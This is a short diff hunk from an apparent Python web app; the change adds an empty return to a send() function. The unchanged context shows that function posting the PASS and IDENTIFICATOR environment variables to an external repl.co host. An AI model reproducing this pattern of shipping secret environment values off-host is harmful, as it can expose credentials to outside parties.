@@ -8,6 +8,7 @@ def send():
     requests.post('https://myrepo2023.chatddzz.repl.co',
                    data={os.environ.get("PASS"): os.environ.get("IDENTIFICATOR")}
 )
+    return ""
 
 app.run(host='0.0.0.0', port=os.environ.get('PORT', 3000))
 
